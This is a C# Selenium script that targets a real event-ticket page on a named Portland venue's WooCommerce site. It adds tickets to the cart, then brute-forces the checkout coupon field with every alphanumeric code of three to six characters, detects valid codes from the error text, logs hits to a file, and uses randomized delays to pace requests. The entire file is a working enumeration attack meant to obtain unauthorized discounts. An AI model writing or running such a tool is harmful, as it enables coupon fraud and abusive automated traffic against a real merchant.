using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.DevTools.V129.Target;
using OpenQA.Selenium.Support.UI;
using System;
using System.IO;

internal class Program
{
    private static void Main(string[] args)
    {
        string url = "https://mwlpdx.com/event/new-years-eve-celebration-2/";
        string outputPath = "valid_coupons.txt";
        char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray();
        int minLength = 3; // Start with 3 characters
        int maxLength = 6; // Increment up to 6 characters

        using (IWebDriver driver = new ChromeDriver())
        {
            try
            {
                driver.Navigate().GoToUrl(url);
                WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));

                // Wait and click on the ticket add button until the buy button is enabled
                IWebElement addButton = wait.Until(d => d.FindElement(By.ClassName("tribe-tickets__item__quantity__add")));
                IWebElement buyButton = wait.Until(d => d.FindElement(By.Id("tribe-tickets__buy")));
                while (!buyButton.Enabled)
                {
                    addButton.Click();
                    System.Threading.Thread.Sleep(20);
                }
                buyButton.Click();

                // Wait for coupon field to appear
                IWebElement couponField = wait.Until(d => d.FindElement(By.Id("coupon_code")));
                IWebElement applyButton = driver.FindElement(By.Name("apply_coupon"));

                // Try combinations of different lengths (from minLength to maxLength)
                for (int length = minLength; length <= maxLength; length++)
                {
                    char[] combination = new char[length];
                    if (GenerateCombinationsRecursive(driver, By.Id("coupon_code"), By.Name("apply_coupon"), combination, charArray, 0, outputPath))
                    {
                        Console.WriteLine("A valid coupon has been found. Stopping...");
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
            finally
            {
                driver.Quit();
            }
        }
    }

    // Recursive method to generate and apply coupon combinations
    private static bool GenerateCombinationsRecursive(IWebDriver driver, By couponFieldSelector, By applyButtonSelector,
        char[] combination, char[] charArray, int depth, string outputPath)
    {
        if (depth == combination.Length)
        {
            string currentCombination = new string(combination);
            Console.WriteLine($"Trying coupon: {currentCombination}");

            try
            {
                // Re-locate elements to avoid StaleElementReferenceException
                IWebElement couponField = driver.FindElement(couponFieldSelector);
                IWebElement applyButton = driver.FindElement(applyButtonSelector);

                // Enter coupon code and apply it
                couponField.Clear();
                couponField.SendKeys(currentCombination);
                System.Threading.Thread.Sleep(randSleepTime()); // Allow time for page update

                try
                {
                    if (!applyButton.Enabled || !applyButton.Displayed)
                    {
                        // If the button is not clickable, wait and retry
                        Console.WriteLine("Apply button not clickable, retrying...");
                        System.Threading.Thread.Sleep(randSleepTime());
                        // Wait for the button to be clickable and click it, retry if it fails
                        new WebDriverWait(driver, TimeSpan.FromSeconds(10)).Until(d => applyButton.Enabled);
                        // Wait until the button is enabled
                        applyButton.Click();
                    }
                    else
                    {
                        applyButton.Click();
                    }
                }
                catch (ElementClickInterceptedException)
                {
                    // If the button is not clickable, wait and retry
                    Console.WriteLine("Apply button not clickable, retrying...");
                    System.Threading.Thread.Sleep(randSleepTime());
                    // Wait for the button to be clickable and click it, retry if it fails
                    new WebDriverWait(driver, TimeSpan.FromSeconds(10)).Until(d => applyButton.Enabled);
                    // Wait until the button is enabled
                    applyButton.Click();
                }

                // Wait for the result and validate
                System.Threading.Thread.Sleep(randSleepTime()); // Allow time for page update

                WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(randSleepTime()));
                IWebElement errorElement = null;

                try
                {
                    // Check for error inside the notices wrapper
                    errorElement = wait.Until(d => d.FindElement(By.CssSelector(".woocommerce-notices-wrapper .woocommerce-error")));
                }
                catch (WebDriverTimeoutException)
                {
                    // No error element found, coupon is valid
                    Console.WriteLine($"Valid coupon found: {currentCombination}");
                    WriteResultToFile(currentCombination, outputPath);
                    return true; // Stop after finding a valid coupon
                }

                // Check if the error message matches "Coupon DOES NOT EXIST!"
                if (errorElement.Text.Contains("DOES NOT EXIST!"))
                {
                    Console.WriteLine($"Invalid coupon: {currentCombination}");
                    return false; // Continue to the next combination
                }
                else
                {
                    // Valid coupon found
                    Console.WriteLine($"Valid coupon found: {currentCombination}");
                    WriteResultToFile(currentCombination, outputPath);
                    return true; // Stop after finding a valid coupon
                }
            }
            catch (StaleElementReferenceException)
            {
                Console.WriteLine("Encountered stale element. Retrying...");
                return GenerateCombinationsRecursive(driver, couponFieldSelector, applyButtonSelector, combination, charArray, depth, outputPath);
            }
        }

        // Try all characters for the current position and recurse
        foreach (char c in charArray)
        {
            combination[depth] = c;
            if (GenerateCombinationsRecursive(driver, couponFieldSelector, applyButtonSelector, combination, charArray, depth + 1, outputPath))
            {
                return true; // Return true once a valid coupon is found
            }
        }

        // Return false if no valid coupon was found at this level
        return false;
    }

    // Write the valid coupon to a file
    private static void WriteResultToFile(string combination, string outputPath)
    {
        string result = $"{DateTime.Now}: Valid coupon found - {combination}";
        File.AppendAllText(outputPath, result + Environment.NewLine);
        Console.WriteLine(result);
    }

    public static int randSleepTime()
    {
        return new Random().Next(500, 2001);
    }

    //create a method that will output the log to txt file
}